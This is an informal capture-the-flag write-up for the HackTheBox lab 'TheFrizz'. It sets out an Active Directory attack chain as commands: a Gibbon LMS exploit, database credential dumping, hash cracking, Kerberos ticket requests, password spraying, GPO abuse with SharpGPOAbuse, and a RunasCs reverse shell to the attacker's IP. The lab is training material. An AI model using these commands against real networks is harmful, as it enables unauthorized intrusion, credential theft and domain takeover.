# TheFrizz \[Medium]



<pre data-overflow="wrap"><code>f.frizzle valid

WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours where your accounts will not be available. Please bear with us, and thank you for your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos. 

https://github.com/maddsec/CVE-2023-34598
http://frizzdc.frizz.htb/Gibbon-LMS/?q=gibbon.sql

.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;" 
.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "select * from gibbon.gibbonperson;"
10.4.32-MariaDB

hashcat64.exe -m 1410 hash.txt rockyou.txt -d 1 -O
its going fast alright but maybe a problem with the format of hash iono

echo 'f.frizzle:$dynamic_62$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489' > hash
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt hash


SSH open no winrm, smb again no luck
sudo faketime -f '+7h' python3 getTGT.py -dc-ip 10.10.11.60 frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23'

export KRB5CCNAME=f.frizzle.ccache; faketime -f '+7h' ssh f.frizzle@frizz.htb -K

Look for deleted fie in recycle bin

<strong>$shell = New-Object -ComObject Shell.Application
</strong>$recycleBin = $shell.Namespace(0xA)
$recycleBin.items() | Select-Object Name, Path

Restore deleted file

$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
$items = $recycleBin.Items()
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
$documentsPath = [Environment]::GetFolderPath("Desktop")
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
$documents.MoveHere($item)


faketime -f "+7h" scp f.frizzle@frizz.htb:C:/Users/f.frizzle/Desktop/wapt-backup-sunday.7z ~/htb/rooms/frizz 
cat waptserver.ini

!suBcig@MehTed!R
[FIX]
faketime -f '+7h' ./kerbrute_linux_amd64 passwordspray -d FRIZZ.HTB ~/htb/rooms/frizz/output.txt '!suBcig@MehTed!R' --dc 'FRIZZDC.FRIZZ.HTB' -v
KRB_AP_ERR_SKEW Clock skew too great [Rest show invalid which means this the one]

sudo faketime -f '+7h' python3 getTGT.py -dc-ip 10.10.11.60 frizz.htb/'M.SchoolBus':'!suBcig@MehTed!R'

faketime -f '+7h' bloodhound-python -u 'f.frizzle' -p 'Jenni_Luvs_Magic23' -d frizz.htb -dc frizzdc.frizz.htb -ns 10.10.11.60 -c all --zip

New-GPO -Name "whatever"
New-GPLink -Name "whatever" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName whatever
gpupdate /force


.\RunasCs.exe "M.SchoolBus"  '!suBcig@MehTed!R' powershell.exe -r 10.10.14.2:9001
Catch revshell with all privs
</code></pre>

<figure><img src="../../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

```
[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB

[realms]
    FRIZZ.HTB = {
        kdc = FRIZZDC.FRIZZ.HTB
        admin_server = FRIZZDC.FRIZZ.HTB
        default_domain = FRIZZ.HTB
```

### Creds

```
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

{% code title="SHA256 password with salt separated by colon" %}
```
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
```
{% endcode %}

```
f.frizzle:Jenni_Luvs_Magic23 
```

### Enum

```
frizz\w.webservice is running the MySQL service [NTLM Responder]
SMB, RPC, LDAP no access
```

### Proof

#### Broken SSH auth via Kerberos

<figure><img src="../../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
export KRB5CCNAME=f.frizzle.ccache; faketime -f '+7h' ssh f.frizzle@frizz.htb -K

PROBLEMS
1. Cannot find KDC for realm "FRIZZ.HTB"

No credentials were supplied, or the credentials were unavailable or inaccessible
added /etc/krb5.conf
2. Server not found in Kerberos database

how create /etc/krb5.conf file

[libdefault]
        default_realm = FRIZZ.HTB

[realms]
        FRIZZ.HTB = {
                kdc = frizzdc.frizz.htb
                admin_server = frizzdc.frizz.htb
        }

[domain_realm]
        frizz.htb = FRIZZ.HTB
        .frizz.htb = FRIZZ.HTB
        
###This one technically wasn't the krb5 file that fixed it, the one above did
        
smb listing also works with our ticket
faketime -f '+7h' netexec smb frizzdc.frizz.htb -d frizz.htb  -k --use-kcache
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\f.frizzle from ccache 

Our ticket is valid by calling klist which shows valid result

klist
Ticket cache: FILE:f.frizzle.ccache
Default principal: f.frizzle@FRIZZ.HTB

Valid starting     Expires            Service principal
08/15/25 08:58:00  08/15/25 18:58:00  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 08/16/25 08:57:41

enabled gssapiauthentication in ssh_config   
     
MY GUESS
its a problem with the krb5.conf file , we're not pointing to the right direction
initially problem with skew, then no realm and krb file fixed that but now its saying it cant find the server in kb db
what is the server in kerberos database atp?

THE FIX
frizzdc.frizz.htb comes first boys
whatever the server in the conf file is thats first mate
so we modified admin_server and kdc to frizz.htb, switched hosts order and frizz.htb came first
so that didnt work which means the kdc and server names are not mutable and we'd have to find it (guess)
the web root was hosted at dcfrizz.frizz.htb and it mentioned all auth would be via kerberos there so it makes sense that the server would at the same domain name.
```
{% endcode %}

